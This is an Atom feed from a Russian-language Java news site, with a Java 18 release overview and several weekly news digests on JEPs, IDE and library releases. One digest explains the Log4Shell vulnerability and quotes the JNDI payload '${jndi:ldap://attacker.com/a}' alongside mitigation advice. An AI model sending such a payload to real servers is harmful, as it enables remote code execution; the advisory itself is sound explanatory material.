<?xml version="1.0" encoding="UTF-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>miniJUG</title>
  <link rel="alternate" type="text/html" href="https://minijug.ru" />
  <subtitle type="text">Новости Java</subtitle>
  <id>https://minijug.ru/feed.xml</id>
  <updated>2022-03-21T17:00:00Z</updated>
  <entry>
    <title>Вышла Java 18</title>
    <link rel="alternate" type="text/html" href="https://minijug.ru/java_18.html" />
    <author>
      <name>Евгений Козлов</name>
    </author>
    <id>https://minijug.ru/java_18.html</id>
    <updated>2022-03-21T17:00:00Z</updated>
    <published>2022-03-21T17:00:00Z</published>
    <content type="html">&lt;p&gt;Вышла общедоступная версия &lt;a href="http://openjdk.java.net/projects/jdk/18/"&gt;Java 18&lt;/a&gt;. В этот релиз попало более &lt;a href="https://builds.shipilev.net/backports-monitor/release-notes-18.html"&gt;2000 закрытых задач и 9 JEP'ов&lt;/a&gt;. Release Notes можно посмотреть &lt;a href="http://jdk.java.net/18/release-notes"&gt;здесь&lt;/a&gt;. Изменения API можно посмотреть по &lt;a href="https://javaalmanac.io/jdk/18/apidiff/17/"&gt;этой ссылке&lt;/a&gt;.&lt;/p&gt;
&lt;!-- cut --&gt;
&lt;p&gt;Ссылки на скачивание:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href="https://www.oracle.com/java/technologies/downloads/"&gt;Oracle JDK&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href="http://jdk.java.net/18/"&gt;OpenJDK&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Перечислим JEP'ы, которые попали в Java 18.&lt;/p&gt;
&lt;h5&gt;&lt;a href="https://openjdk.java.net/jeps/420"&gt;Паттерн-матчинг для &lt;code&gt;switch&lt;/code&gt; (Second Preview) (JEP 420)&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;Паттерн-матчинг для &lt;code&gt;switch&lt;/code&gt;, который &lt;a href="https://openjdk.java.net/jeps/406"&gt;появился в Java 17&lt;/a&gt; в режиме preview, остаётся в этом статусе. В этом релизе присутствует два изменения по сравнению с предыдущей версией.&lt;/p&gt;
&lt;p&gt;Первое изменение &amp;ndash; константные паттерны теперь должны находиться выше, чем паттерны с условиями того же типа. Например, такой код успешно компилируется в Java 17:&lt;/p&gt;
&lt;pre&gt;&lt;span style="color: blue"&gt;switch&lt;/span&gt; (value) {
    &lt;span style="color: blue"&gt;case&lt;/span&gt; Integer i &amp;&amp; bar() -&gt; {}
    &lt;span style="color: blue"&gt;case&lt;/span&gt; 3 -&gt; {}
    &lt;span style="color: blue"&gt;case&lt;/span&gt; Integer i -&gt; {}
}&lt;/pre&gt;
&lt;p&gt;Но не компилируется в Java 18:&lt;/p&gt;
&lt;pre&gt;&amp;gt; javac --enable-preview --release 18 Main.java
&lt;span style="color: red"&gt;Main.java:8: error: this case label is dominated by a preceding case label
            case 3 -&gt; {}
                 ^&lt;/span&gt;&lt;/pre&gt;

&lt;p&gt;Чтобы код компилировался на Java 18, нужно переместить константный паттерн выше:&lt;/p&gt;
&lt;pre&gt;&lt;span style="color: blue"&gt;switch&lt;/span&gt; (value) {
    &lt;span style="color: blue"&gt;case&lt;/span&gt; 3 -&gt; {}
    &lt;span style="color: blue"&gt;case&lt;/span&gt; Integer i &amp;&amp; bar() -&gt; {}
    &lt;span style="color: blue"&gt;case&lt;/span&gt; Integer i -&gt; {}
}&lt;/pre&gt;

&lt;p&gt;Второе изменение &amp;ndash; улучшенная проверка исчерпываемости для дженериков. Например, такой код не компилируется в Java 17, несмотря на то что &lt;code&gt;switch&lt;/code&gt; покрывает все возможные случаи:&lt;/p&gt;
&lt;pre&gt;&lt;span style="color: blue"&gt;sealed interface&lt;/span&gt; Foo&amp;lt;T&amp;gt; { }
&lt;span style="color: blue"&gt;final class&lt;/span&gt; A&amp;lt;T&amp;gt; &lt;span style="color: blue"&gt;implements&lt;/span&gt; Foo&amp;lt;T&amp;gt; { }
&lt;span style="color: blue"&gt;final class&lt;/span&gt; B&amp;lt;T&amp;gt; &lt;span style="color: blue"&gt;implements&lt;/span&gt; Foo&amp;lt;T&amp;gt; { }
&lt;span style="color: blue"&gt;final class&lt;/span&gt; C &lt;span style="color: blue"&gt;implements&lt;/span&gt; Foo&amp;lt;String&amp;gt; { }

&lt;span style="color: blue"&gt;static int&lt;/span&gt; testGenericSealedExhaustive(Foo&amp;lt;Integer&amp;gt; foo) {
    &lt;span style="color: blue"&gt;return switch&lt;/span&gt; (foo) {
        &lt;span style="color: blue"&gt;case&lt;/span&gt; A&amp;lt;Integer&amp;gt; a -&amp;gt; 1;
        &lt;span style="color: blue"&gt;case&lt;/span&gt; B&amp;lt;Integer&amp;gt; b -&amp;gt; 2;
    };
}&lt;/pre&gt;
&lt;pre&gt;javac --enable-preview --release 17 Main.java
&lt;span style="color: red"&gt;Main.java:10: error: the switch expression does not cover all possible input values
    return switch (foo) {
           ^&lt;/span&gt;&lt;/pre&gt;
&lt;p&gt;В Java 18 же такой код успешно компилируется.&lt;/p&gt;

&lt;h5&gt;&lt;a href="https://openjdk.java.net/jeps/413"&gt;Сниппеты кода в документации Java API (JEP 413)&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;В JavaDoc теперь поддерживается новый тег &lt;code&gt;@snippet&lt;/code&gt;, который указывает на то, что данный участок является примером кода.&lt;/p&gt;
&lt;p&gt;Пример сниппета кода:&lt;/p&gt;
&lt;pre&gt;/**
 * A simple program.
 * {@snippet :
 *   public class HelloWorld {
 *     public static void main(String... args) {
 *       System.out.println("Hello World!"); // @highlight substring="println"
 *     }
 *   }
 * }
 */&lt;/pre&gt;
&lt;p&gt;Сгенерированная документация для него будет выглядеть примерно следующим образом:&lt;/p&gt;
&lt;pre&gt;public class HelloWorld {
  public static void main(String... args) {
    System.out.&lt;b&gt;println&lt;/b&gt;("Hello World!");
  }
}&lt;/pre&gt;

&lt;p&gt;Тег &lt;code&gt;@snippet&lt;/code&gt; введён в качестве замены существующему методу вставки примеров кода в JavaDoc с помощью блоков &lt;code&gt;&amp;lt;pre&amp;gt;{@code ... }&amp;lt;/pre&amp;gt;&lt;/code&gt;, который имеет ряд недостатков:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Тег &lt;code&gt;@code&lt;/code&gt; не поддерживает возможность указания языка фрагмента, а значит теряется возможность проверки корректности кода, подсветки синтаксиса и ссылок, поскольку инструменты трактуют все такие фрагменты как простой текст.&lt;/li&gt;
  &lt;li&gt;Подсветку синтаксиса также нельзя добавить и вручную, поскольку внутренние HTML-теги будут трактоваться как часть фрагмента. Проблему можно решить через использование тега &lt;code&gt;&amp;lt;pre&amp;gt;...&amp;lt;/pre&amp;gt;&lt;/code&gt; (без &lt;code&gt;@code&lt;/code&gt;), но тогда полностью исчезает указание того, что данный фрагмент документации является кодом.&lt;/li&gt;
  &lt;li&gt;Фрагменты кода часто являются неполными или содержат плейсхолдеры и многоточия. Тег &lt;code&gt;@code&lt;/code&gt; никак не решает данную проблему.&lt;/li&gt;
  &lt;li&gt;Индентация строк во фрагменте остаётся такой, как написана в исходном коде.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Новый тег же не только решает все вышеперечисленные проблемы, но и добавляет новые возможности:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;В сниппете можно указать язык фрагмента с помощью атрибута &lt;code&gt;lang&lt;/code&gt;: &lt;code&gt;{@snippet lang=properties : ... }&lt;/code&gt;. Если язык не указан, то считается, что это Java. Проверка корректности пока ограничена только сбалансированностью фигурных скобок, но инструменты могут реализовать более сложную проверку.&lt;/li&gt;
  &lt;li&gt;Подсветка отдельных элементов фрагмента может быть сделана с помощью тега &lt;code&gt;@highlight&lt;/code&gt;, который поддерживает три стиля &lt;code&gt;bold&lt;/code&gt;, &lt;code&gt;italic&lt;/code&gt; и &lt;code&gt;highlighted&lt;/code&gt;. Все теги указываются в комментариях, поэтому полностью исчезают после генерации. Инструменты также имеют возможность сделать автоматическую подсветку синтаксиса.&lt;/li&gt;
  &lt;li&gt;Многоточия и неполные фрагменты кода возможны с помощью тега &lt;code&gt;@replace&lt;/code&gt;. Фрагмент кода до замены плейсхолдеров остаётся синтаксически валидным кодом.&lt;/li&gt;
  &lt;li&gt;В сниппете можно сделать ссылки с помощью тега &lt;code&gt;@link&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Общие отступы строк фрагмента съедаются при генерации документации.&lt;/li&gt;
  &lt;li&gt;При генерации HTML-документации стандартным доклетом сниппеты кода лучше выделяются на фоне остальной документации благодаря серому фону. Кроме того, каждый сниппет кода будет сопровождаться кнопкой копирования в буфер обмена.&lt;/li&gt;
  &lt;li&gt;Сниппеты кода могут быть внешними и подтягивать код из внешних файлов. Чтобы иметь возможность не включать весь файл в JavaDoc, поддерживаются регионы с помощью тега &lt;code&gt;@region&lt;/code&gt;. Внешние сниппеты хороши тем, что внешние файлы могут быть предварительно проверены на корректность (например, если файлы Java не будут компилироваться, то и не смогут быть включены в JavaDoc).&lt;/li&gt;
&lt;/ul&gt;

&lt;h5&gt;&lt;a href="https://openjdk.java.net/jeps/400"&gt;UTF-8 по умолчанию (JEP 400)&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;UTF-8 теперь является кодировкой по умолчанию на всех платформах. Кодировка по умолчанию используется в таких API как &lt;code&gt;java.io&lt;/code&gt; (&lt;a href="https://docs.oracle.com/en/java/javase/18/docs/api/java.base/java/io/InputStreamReader.html"&gt;&lt;code&gt;InputStreamReader&lt;/code&gt;&lt;/a&gt;, &lt;a href="https://docs.oracle.com/en/java/javase/18/docs/api/java.base/java/io/FileReader.html"&gt;&lt;code&gt;FileReader&lt;/code&gt;&lt;/a&gt;, &lt;a href="https://docs.oracle.com/en/java/javase/18/docs/api/java.base/java/io/OutputStreamWriter.html"&gt;&lt;code&gt;OutputStreamWriter&lt;/code&gt;&lt;/a&gt;, &lt;a href="https://docs.oracle.com/en/java/javase/18/docs/api/java.base/java/io/FileWriter.html"&gt;&lt;code&gt;FileWriter&lt;/code&gt;&lt;/a&gt;, &lt;a href="https://docs.oracle.com/en/java/javase/18/docs/api/java.base/java/io/PrintStream.html"&gt;&lt;code&gt;PrintStream&lt;/code&gt;&lt;/a&gt;), &lt;code&gt;java.util&lt;/code&gt; (&lt;a href="https://docs.oracle.com/en/java/javase/18/docs/api/java.base/java/util/Formatter.html"&gt;&lt;code&gt;Formatter&lt;/code&gt;&lt;/a&gt;, &lt;a href="https://docs.oracle.com/en/java/javase/18/docs/api/java.base/java/util/Scanner.html"&gt;&lt;code&gt;Scanner&lt;/code&gt;&lt;/a&gt;), &lt;code&gt;java.net&lt;/code&gt; (&lt;a href="https://docs.oracle.com/en/java/javase/18/docs/api/java.base/java/net/URLEncoder.html"&gt;&lt;code&gt;URLEncoder&lt;/code&gt;&lt;/a&gt;, &lt;a href="https://docs.oracle.com/en/java/javase/18/docs/api/java.base/java/net/URLDecoder.html"&gt;&lt;code&gt;URLDecoder&lt;/code&gt;&lt;/a&gt;). Кодировка в пакете &lt;code&gt;java.nio.file&lt;/code&gt; осталась неизменной: в нём самого начала UTF-8 было в качестве &lt;code&gt;Charset&lt;/code&gt; по умолчанию.&lt;/p&gt;
&lt;p&gt;Если в Java 17 и более ранних версиях кодировка по умолчанию определялась при старте JVM и зависела от разных факторов (операционная система, пользовательская локаль, кодировка операционной системы), то с Java 18 она всегда UTF-8. Если нужно включить старый механизм установки кодировки при старте, то можно использовать опцию &lt;code&gt;-Dfile.encoding=COMPAT&lt;/code&gt;. Кроме того, эту кодировку можно узнать, используя свойство &lt;code&gt;native.encoding&lt;/code&gt;, которое &lt;a href="https://bugs.openjdk.java.net/browse/JDK-8265989"&gt;появилось в Java 17&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Чтобы будущий переход на Java 18 был более гладким, рекомендуется стартовать свои приложения на Java 17 или более ранних версиях с опцией &lt;code&gt;-Dfile.encoding=UTF-8&lt;/code&gt;.&lt;/p&gt;

&lt;h5&gt;&lt;a href="https://openjdk.java.net/jeps/408"&gt;Простой веб-сервер (JEP 408)&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;Появилась новая утилита &lt;code&gt;jwebserver&lt;/code&gt;, которая запускает простой веб-сервер, предоставляющий статический доступ к указанной папке с файлами. По умолчанию используется текущая директория (если не указана опция &lt;code&gt;-d&lt;/code&gt;), а порт равен 8000 (если не указана опция &lt;code&gt;-p&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;Веб-сервер поддерживает только HTTP/1.1, не поддерживает HTTPS и аутентификацию. Его рекомендуется использовать только для целей разработки и тестирования.&lt;/p&gt;
&lt;p&gt;Вместе с утилитой &lt;code&gt;jwebserver&lt;/code&gt; также появилось новое API, позволяющее запускать веб-сервер программно. За это отвечают новые классы &lt;a href="https://docs.oracle.com/en/java/javase/18/docs/api/jdk.httpserver/com/sun/net/httpserver/SimpleFileServer.html"&gt;&lt;code&gt;SimpleFileServer&lt;/code&gt;&lt;/a&gt;, &lt;a href="https://docs.oracle.com/en/java/javase/18/docs/api/jdk.httpserver/com/sun/net/httpserver/HttpHandlers.html"&gt;&lt;code&gt;HttpHandlers&lt;/code&gt;&lt;/a&gt; и &lt;a href="https://docs.oracle.com/en/java/javase/18/docs/api/jdk.httpserver/com/sun/net/httpserver/Request.html"&gt;&lt;code&gt;Request&lt;/code&gt;&lt;/a&gt; в пакете &lt;a href="https://docs.oracle.com/en/java/javase/18/docs/api/jdk.httpserver/com/sun/net/httpserver/package-summary.html"&gt;&lt;code&gt;com.sun.net.httpserver&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;

&lt;h5&gt;&lt;a href="https://openjdk.java.net/jeps/421"&gt;Deprecate Finalization for Removal (JEP 421)&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;Финализация объектов, которая &lt;a href="https://bugs.openjdk.java.net/browse/JDK-8165641"&gt;стала deprecated в Java 9&lt;/a&gt;, теперь стала deprecated for removal, то есть подлежит окончательному удалению.&lt;/p&gt;
&lt;p&gt;Начиная с Java 18, все методы, относящиеся к финализации, помечены аннотацией &lt;code&gt;@Deprecated(forRemoval=true)&lt;/code&gt;. Это &lt;a href="https://docs.oracle.com/en/java/javase/18/docs/api/java.base/java/lang/Object.html#finalize()"&gt;&lt;code&gt;Object.finalize()&lt;/code&gt;&lt;/a&gt; и его наследники (часть из них удалены полностью), &lt;a href="https://docs.oracle.com/en/java/javase/18/docs/api/java.base/java/lang/Runtime.html#runFinalization()"&gt;&lt;code&gt;Runtime.runFinalization()&lt;/code&gt;&lt;/a&gt; и &lt;a href="https://docs.oracle.com/en/java/javase/18/docs/api/java.base/java/lang/System.html#runFinalization()"&gt;&lt;code&gt;System.runFinalization()&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Сама финализация всё ещё работает, однако появилась новая опция &lt;code&gt;--finalization=disabled&lt;/code&gt;, которая её отключает.&lt;/p&gt;
&lt;p&gt;В будущих версиях Java работа по дальнейшему отказу от финализации может быть продолжена. Сначала финализацию предлагается отключить по умолчанию с возможностью включения, потом отключить её полностью, и, наконец, удалить весь API финализации.&lt;/p&gt;

&lt;h5&gt;&lt;a href="https://openjdk.java.net/jeps/416"&gt;Reimplement Core Reflection with Method Handles (JEP 416)&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;Механизм рефлексии в пакете &lt;a href="https://docs.oracle.com/en/java/javase/18/docs/api/java.base/java/lang/reflect/package-summary.html"&gt;&lt;code&gt;java.lang.reflect&lt;/code&gt;&lt;/a&gt; теперь реализован поверх method handles в пакете &lt;a href="https://docs.oracle.com/en/java/javase/18/docs/api/java.base/java/lang/invoke/package-summary.html"&gt;&lt;code&gt;java.lang.invoke&lt;/code&gt;&lt;/a&gt;. В Java 17 и раньше эти два механизма существовали независимо и имели разную внутреннюю реализацию. Такое дублирование усложняет поддержку платформы и внесение в неё новых языковых изменений.&lt;/p&gt;
&lt;p&gt;Для разработчика такое изменение не должно иметь видимых последствий (кроме небольших различий в производительности). Однако на всякий случай предоставлен ключ, позволяющий включить старую реализацию: &lt;code&gt;-Djdk.reflect.useDirectMethodHandle=false&lt;/code&gt;. Старая реализация будет полностью удалена в одной из следующих версий Java.&lt;/p&gt;

&lt;h5&gt;&lt;a href="https://openjdk.java.net/jeps/418"&gt;Internet-Address Resolution SPI (JEP 418)&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;Появилось новое SPI, позволяющее кастомизировать получение IP-адреса по имени хоста (и наоборот). По умолчанию &lt;code&gt;InetAddress&lt;/code&gt; API делает нативный резолвинг, то есть делегированием операционной системе. Если нужен альтернативный механизм резолвинга, то теперь его можно предоставить путём реализации нового провайдера сервиса &lt;a href="https://docs.oracle.com/en/java/javase/18/docs/api/java.base/java/net/spi/InetAddressResolverProvider.html"&gt;&lt;code&gt;InetAddressResolverProvider&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Примеры случаев, когда может понадобиться альтернативный резолвинг:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Более производительный резолвинг, чем системный.&lt;/li&gt;
  &lt;li&gt;Неблокирующий резолвинг.&lt;/li&gt;
  &lt;li&gt;Альтернативный протокол DNS (например, DNS over QUIC).&lt;/li&gt;
  &lt;li&gt;Тестирование (подмена IP-адресов, моки).&lt;/li&gt;
&lt;/ul&gt;

&lt;h5&gt;&lt;a href="https://openjdk.java.net/jeps/419"&gt;Foreign Function &amp; Memory API (Second Incubator) (JEP 419)&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;Foreign Function &amp; Memory API, который &lt;a href="https://openjdk.java.net/jeps/412"&gt;появился в Java 17&lt;/a&gt; в инкубационном статусе, остаётся в этом статусе в модуле &lt;a href="https://docs.oracle.com/en/java/javase/18/docs/api/jdk.incubator.foreign/module-summary.html"&gt;&lt;code&gt;jdk.incubator.foreign&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;В Java 19 это API перестанет быть инкубационным и &lt;a href="https://openjdk.java.net/jeps/424"&gt;станет preview API&lt;/a&gt; в пакете &lt;code&gt;java.lang.foreign&lt;/code&gt;.&lt;/p&gt;

&lt;h5&gt;&lt;a href="https://openjdk.java.net/jeps/417"&gt;Vector API (Third Incubator) (JEP 417)&lt;/a&gt;&lt;/h5&gt;
&lt;p&gt;Векторное API, которое появилось в &lt;a href="https://openjdk.java.net/jeps/338"&gt;Java 16&lt;/a&gt; в инкубационном статусе, осталось в инкубационном статусе в &lt;a href="https://openjdk.java.net/jeps/414"&gt;Java 17&lt;/a&gt;, продолжает находиться в этом статусе в модуле &lt;a href="https://docs.oracle.com/en/java/javase/18/docs/api/jdk.incubator.vector/module-summary.html"&gt;&lt;code&gt;jdk.incubator.vector&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;

&lt;p class="pt-3"&gt;Java 18 не является LTS-релизом и будет получать обновления только в течение полугода (до сентября 2022).&lt;/p&gt;</content>
  </entry>
  <entry>
    <title>Новости Java #36</title>
    <link rel="alternate" type="text/html" href="https://minijug.ru/java_news_36.html" />
    <author>
      <name>Евгений Козлов</name>
    </author>
    <id>https://minijug.ru/java_news_36.html</id>
    <updated>2022-03-20T17:00:00Z</updated>
    <published>2022-03-20T17:00:00Z</published>
    <content type="html">&lt;p&gt;&amp;bull; Вышел новый черновик JEP: &lt;a href="http://openjdk.java.net/jeps/8283291"&gt;Extended Opcodes&lt;/a&gt;. В нём предлагается расширить пространство возможных опкодов в class-файле, убрав ограничение на длину опкода в 1 байт. Это позволит решить проблему нехватки опкодов, которых сейчас осталось всего 55 (из 256 возможных). Расширение опкодов не затронет существующие опкоды, и они так и останутся однобайтовыми, а новые расширенные опкоды будут состоять из двух частей: наименее значащий байт будет отделён от остальных байтов, которые будут храниться в отдельном атрибуте. Такое решение сохранит максимальную совместимость с текущей схемой, а также сохранит компактность class-файлов.&lt;/p&gt;

&lt;p&gt;&amp;bull; Вышел &lt;a href="https://www.youtube.com/watch?v=GnNnQY5ujFg"&gt;Eclipse 2022-03&lt;/a&gt;. Перечислим некоторые нововведения и улучшения:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Новый quick assist, позволяющий быстро добавлять статический импорт в список Favorites.&lt;/li&gt;
  &lt;li&gt;Новый quick assist "Extract lambda body to method".&lt;/li&gt;
  &lt;li&gt;Теперь можно ставить брейкпоинт на вхождение в лямбду или выход из лямбды.&lt;/li&gt;
  &lt;li&gt;Возможность переходить в место объявления поля из списка переменных в дебаггере.&lt;/li&gt;
  &lt;li&gt;При изменении final поля в дебаггере теперь выдаётся предупреждение.&lt;/li&gt;
  &lt;li&gt;В дебаггере теперь отображается PID процесса (в Debug View, а также в консоли).&lt;/li&gt;
  &lt;li&gt;6 новых настроек форматирования Java-кода.&lt;/li&gt;
  &lt;li&gt;Улучшения в Maven и Git.&lt;/li&gt;
  &lt;li&gt;Возможность открывать большие файлы в редакторах, отличных от дефолтных.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&amp;bull; Вышла статья &lt;a href="https://tschatzl.github.io/2022/03/14/jdk18-g1-parallel-gc-changes.html"&gt;"JDK 18 G1/Parallel/Serial GC changes"&lt;/a&gt;, где рассказано, какие улучшения в сборщиках мусора произошли в Java 18.&lt;/p&gt;

&lt;p&gt;&amp;bull; Вышел &lt;a href="https://docs.gradle.org/7.4/release-notes.html"&gt;Gradle 7.4&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&amp;bull; Вышел &lt;a href="https://www.eclipse.org/lists/birt-dev/msg11552.html"&gt;BIRT 4.9.0&lt;/a&gt;. Это первый релиз фреймворка спустя 4 года после выхода версии 4.8.0.&lt;/p&gt;</content>
  </entry>
  <entry>
    <title>Новости Java #35</title>
    <link rel="alternate" type="text/html" href="https://minijug.ru/java_news_35.html" />
    <author>
      <name>Евгений Козлов</name>
    </author>
    <id>https://minijug.ru/java_news_35.html</id>
    <updated>2022-03-13T17:00:00Z</updated>
    <published>2022-03-13T17:00:00Z</published>
    <content type="html">&lt;p&gt;&amp;bull; У JDK 19 появился первый JEP, который предложен к выходу в этом релизе. Это &lt;a href="https://openjdk.java.net/jeps/422"&gt;JEP 422: Linux/RISC-V Port&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Также появился новый &lt;a href="https://openjdk.java.net/jeps/424"&gt;JEP 424: Foreign Function &amp; Memory API (Preview)&lt;/a&gt;. Этот JEP является продолжением &lt;a href="https://openjdk.java.net/jeps/419"&gt;JEP 419: Foreign Function &amp; Memory API (Second Incubator)&lt;/a&gt;, однако теперь API уже не будет инкубационным, а станет preview API в пакете &lt;code&gt;java.lang.foreign&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&amp;bull; Появилось несколько черновиков JEP.&lt;/p&gt;
&lt;p&gt;В &lt;a href="https://openjdk.java.net/jeps/8280836"&gt;Sequenced Collections&lt;/a&gt; предлагается ввести несколько новых интерфейсов коллекций (&lt;code&gt;SequencedCollection&lt;/code&gt;, &lt;code&gt;SequencedSet&lt;/code&gt;, &lt;code&gt;SequencedMap&lt;/code&gt;), в которых элементы будут иметь установленный порядок. Сейчас в стандартной библиотеке интерфейса с такой характеристикой нет, и в случае её надобности приходится прибегать либо к слишком общему интерфейсу &lt;code&gt;Collection&lt;/code&gt;, но тогда туда будут попадать неупорядоченные коллекции (например, &lt;code&gt;HashSet&lt;/code&gt;), либо к слишком частному &lt;code&gt;List&lt;/code&gt;, куда не смогут попасть, например, &lt;code&gt;ArrayDeque&lt;/code&gt; или &lt;code&gt;LinkedHashSet&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href="http://openjdk.java.net/jeps/8280173"&gt;Vector API (Fourth Incubator)&lt;/a&gt; &amp;ndash; уже четвёртая итерация Vector API. Предыдущие три попали в Java &lt;a href="https://openjdk.java.net/jeps/338"&gt;16&lt;/a&gt;, &lt;a href="https://openjdk.java.net/jeps/414"&gt;17&lt;/a&gt; и &lt;a href="https://openjdk.java.net/jeps/417"&gt;18&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href="http://openjdk.java.net/jeps/8281710"&gt;TLS Certificate Compression&lt;/a&gt; &amp;ndash; добавление поддержки &lt;a href="https://datatracker.ietf.org/doc/html/rfc8879"&gt;сжатых цепочек сертификатов TLS&lt;/a&gt;. Это позволит ускорить соединения TLS и QUIC из-за уменьшения количества байт, необходимых для передачи во время фазы рукопожатия. Также это может улучшить безопасноть благодаря снижению возможностей атак на основе амплификации. Сжатие TLS-сертификатов уже работает в Chrome и Safari.&lt;/p&gt;
&lt;p&gt;&amp;bull; Вышел &lt;a href="https://groovy-lang.org/releasenotes/groovy-4.0.html"&gt;Groovy 4.0&lt;/a&gt;. Среди новшеств языка выражения &lt;code&gt;switch&lt;/code&gt;, &lt;code&gt;sealed&lt;/code&gt; типы, встроенные проверки типов, встроенные макро-методы, инкубационные фичи (записи, JavaShell, аннотация POJO, контракты, GINQ) и другие.&lt;/p&gt;
&lt;p&gt;&amp;bull; Вышла &lt;a href="https://netbeans.apache.org/download/nb13/index.html"&gt;Apache NetBeans 13&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&amp;bull; Вышла &lt;a href="https://www.infoq.com/news/2022/01/graalvm-22-native-image/"&gt;GraalVM 22.0&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&amp;bull; Вышла &lt;a href="https://www.infoq.com/news/2022/02/eclipse-collections-11-0-0/"&gt;Eclipse Collections 11.0.0&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&amp;bull; Вышла &lt;a href="https://github.com/google/guava/releases/tag/v31.1"&gt;Guava 31.1&lt;/a&gt;.&lt;/p&gt;</content>
  </entry>
  <entry>
    <title>Новости Java #34</title>
    <link rel="alternate" type="text/html" href="https://minijug.ru/java_news_34.html" />
    <author>
      <name>Евгений Козлов</name>
    </author>
    <id>https://minijug.ru/java_news_34.html</id>
    <updated>2021-12-12T17:00:00Z</updated>
    <published>2021-12-12T17:00:00Z</published>
    <content type="html">&lt;p&gt;&amp;bull; Java 18 перешла в &lt;a href="https://mail.openjdk.java.net/pipermail/jdk-dev/2021-December/006287.html"&gt;первую фазу Rampdown&lt;/a&gt;: главный репозиторий JDK был ответвлён в &lt;a href="https://github.com/openjdk/jdk18"&gt;стабилизационный репозиторий JDK 18&lt;/a&gt;, и новых JEP'ов в этом релизе больше не будет.&lt;/p&gt;
&lt;p&gt;Одновременно с этим началась &lt;a href="https://bugs.openjdk.java.net/browse/JDK-8273146"&gt;разработка Java 19&lt;/a&gt;. У нового релиза появилась &lt;a href="https://jdk.java.net/19/"&gt;своя страница&lt;/a&gt;, где уже доступна для скачивания первая ранняя сборка JDK 19-ea+1.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; В популярной библиотеке логирования Apache Log4J 2.x обнаружили &lt;a href="https://www.lunasec.io/docs/blog/log4j-zero-day/"&gt;серьёзную уязвимость&lt;/a&gt;, позволяющую выполнить на уязвимом сервере произвольный код. Уязвимость может быть эксплуатирована, если Log4J используется для параметризированного логирования непроверенного текста, приходящего от пользователя, например:&lt;/p&gt;
&lt;pre&gt;log.info(&lt;span style="color: darkred"&gt;"Сообщение от пользователя: {}"&lt;/span&gt;, userMsg);&lt;/pre&gt;
&lt;p&gt;Злоумышленник может воспользоваться этим и послать строку специального вида (&lt;code&gt;${jndi:ldap://attacker.com/a}&lt;/code&gt;), которую обработает Log4J и загрузит через JNDI вредоносный класс с LDAP-сервера, контролируемого злоумышленником. Класс будет инъектирован в Java-процесс, что позволит атакующему выполнить произвольный код с правами пользователя, от лица которого запущен процесс.&lt;/p&gt;
&lt;p&gt;Так как Apache Log4J является одной из двух самых популярных библиотек логирования в Java (наряду с Logback), то такая уязвимость поставила под угрозу огромное количество сервисов по всему миру, включая крупнейших.&lt;/p&gt;
&lt;p&gt;Наиболее надёжным способом защиты от Log4Shell (такое народное название дали этой уязвимости) является обновление Log4J до версии &lt;a href="https://search.maven.org/artifact/org.apache.logging.log4j/log4j/2.15.0/pom"&gt;2.15.0&lt;/a&gt;. Также решением является установка системного свойства &lt;code&gt;log4j2.formatMsgNoLookups=true&lt;/code&gt;, однако оно работает только для версий Log4J &lt;code&gt;2.10.0&lt;/code&gt; и выше. Кроме того, можно полностью удалить class-файл &lt;code&gt;org/apache/logging/log4j/core/lookup/JndiLookup.class&lt;/code&gt; из библиотеки.&lt;/p&gt;
&lt;p&gt;Уязвимости меньше подвержены &lt;a href="https://gist.github.com/shipilev/cfbe09a31ac32f0cc51078db7898c797"&gt;новые версии Java&lt;/a&gt; (8u191+, 11.0.1+, 13, 15, 17), однако они не защищены от всех возможных векторов атаки, поэтому полагаться на такую защиту крайне нежелательно и настоятельно рекомендуется предпринять один из вышеописанных шагов.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышел &lt;a href="https://www.youtube.com/watch?v=3W9bvidcO20"&gt;Eclipse 2021-12&lt;/a&gt; со следующими нововведениями:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Поддержка разработки на Java 17&lt;/li&gt;
  &lt;li&gt;Новое действие "Convert String concatenation to Text Block"&lt;/li&gt;
  &lt;li&gt;Возможность помечать объекты меткой в режиме отладки&lt;/li&gt;
  &lt;li&gt;Умная вставка текста в поле диалога Open Type (обрезание лишнего)&lt;/li&gt;
  &lt;li&gt;Новый редактор POM с возможностью автодополнения по имени артефакта/плагина и выбором из выпадающего списка версий&lt;/li&gt;
  &lt;li&gt;Новое view "Launch Configurations"&lt;/li&gt;
  &lt;li&gt;Мультикурсоры (одновременное редактирование в нескольких частях файла)&lt;/li&gt;
